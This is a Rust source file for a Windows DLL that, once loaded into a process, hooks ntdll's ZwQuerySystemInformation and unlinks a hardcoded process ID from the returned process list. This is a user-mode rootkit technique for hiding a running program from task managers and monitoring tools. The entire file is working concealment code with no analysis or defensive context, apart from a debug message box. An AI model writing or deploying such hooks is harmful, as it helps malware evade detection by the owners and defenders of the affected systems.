use retour::static_detour;
use std::error::Error;
use std::os::raw::{c_ulong, c_void};
use std::{ffi::CString, iter, mem};
use windows::core::s;
use windows::core::{PCSTR, PCWSTR};
use windows::Wdk::System::SystemInformation::{SystemProcessInformation, SYSTEM_INFORMATION_CLASS};
use windows::Win32::Foundation::{BOOL, HANDLE, NTSTATUS, STATUS_SUCCESS};
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows::Win32::System::SystemServices::{
    DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH,
};
use windows::Win32::System::WindowsProgramming::SYSTEM_PROCESS_INFORMATION;
use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};

const HIDE_PID: i32 = 30488;

static_detour! {
    static ZwQuerySystemInformationHook: unsafe extern "system" fn(SYSTEM_INFORMATION_CLASS, *mut c_void, c_ulong, *mut c_ulong) -> NTSTATUS;
}

// A type alias for `ZwQuerySystemInformation` (makes the transmute easy on the eyes)
type FnZwQuerySystemInformation = unsafe extern "system" fn(
    SYSTEM_INFORMATION_CLASS,
    *mut c_void,
    c_ulong,
    *mut c_ulong,
) -> NTSTATUS;

/// Called when the DLL is attached to the process.
unsafe fn main() -> Result<(), Box<dyn Error>> {
    let address = get_module_symbol_address("ntdll.dll", "ZwQuerySystemInformation")
        .expect("could not find 'ZwQuerySystemInformation' address");
    let target: FnZwQuerySystemInformation = mem::transmute(address);

    ZwQuerySystemInformationHook
        .initialize(target, zwquery_system_infomation_detour)?
        .enable()?;
    Ok(())
}

#[allow(unused_assignments)]
/// Called whenever `ZwQuerySystemInformation` is invoked in the process.
fn zwquery_system_infomation_detour(
    system_infomation_class: SYSTEM_INFORMATION_CLASS,
    mut system_infomation: *mut c_void,
    system_infomation_length: c_ulong,
    return_length: *mut c_ulong,
) -> NTSTATUS {
    let mut prev = 0;
    let status = unsafe {
        ZwQuerySystemInformationHook.call(
            system_infomation_class,
            system_infomation,
            system_infomation_length,
            return_length,
        )
    };
    if status != STATUS_SUCCESS || system_infomation_class != SystemProcessInformation {
        return status;
    }

    let mut psystem_information: *mut SYSTEM_PROCESS_INFORMATION =
        unsafe { mem::transmute(system_infomation) };
    loop {
        if HIDE_PID == unsafe { (*psystem_information).UniqueProcessId.0 } as i32 {
            let st = unsafe { format!("system information ==> {:#?}", *psystem_information) };
            unsafe { MessageBoxA(None, PCSTR::from_raw(st.as_ptr()), s!("info"), MB_OK) };
            if prev == 0 {
                system_infomation = (psystem_information as u64
                    + (unsafe { *psystem_information }).NextEntryOffset as u64)
                    as *mut c_void;
            } else if (unsafe { *psystem_information }).NextEntryOffset == 0 {
                (unsafe { *(prev as *mut SYSTEM_PROCESS_INFORMATION) }).NextEntryOffset = 0;
            } else {
                unsafe {
                    (*(prev as *mut SYSTEM_PROCESS_INFORMATION)).NextEntryOffset +=
                        (*psystem_information).NextEntryOffset;
                }
            }
            break;
        } else {
            prev = psystem_information as u64;
        }

        if unsafe { (*psystem_information).NextEntryOffset == 0 } {
            break;
        }

        psystem_information =
            unsafe { psystem_information as u64 + (*psystem_information).NextEntryOffset as u64 }
                as *mut SYSTEM_PROCESS_INFORMATION;
    }

    status
}

/// Returns a module symbol's absolute address.
fn get_module_symbol_address(module: &str, symbol: &str) -> Option<usize> {
    let module = module
        .encode_utf16()
        .chain(iter::once(0))
        .collect::<Vec<u16>>();
    let symbol = CString::new(symbol).unwrap();
    unsafe {
        let handle = GetModuleHandleW(PCWSTR(module.as_ptr() as _)).unwrap();
        match GetProcAddress(handle, PCSTR(symbol.as_ptr() as _)) {
            Some(func) => Some(func as usize),
            None => None,
        }
    }
}

#[no_mangle]
unsafe extern "system" fn DllMain(_hinst: HANDLE, reason: u32, _reserved: *mut c_void) -> BOOL {
    match reason {
        DLL_PROCESS_ATTACH => {
            println!("attaching");
            unsafe { main().unwrap() }
        }
        DLL_PROCESS_DETACH => {
            println!("detaching");
        }
        DLL_THREAD_ATTACH => {}
        DLL_THREAD_DETACH => {}
        _ => {}
    };
    return BOOL::from(true);
}
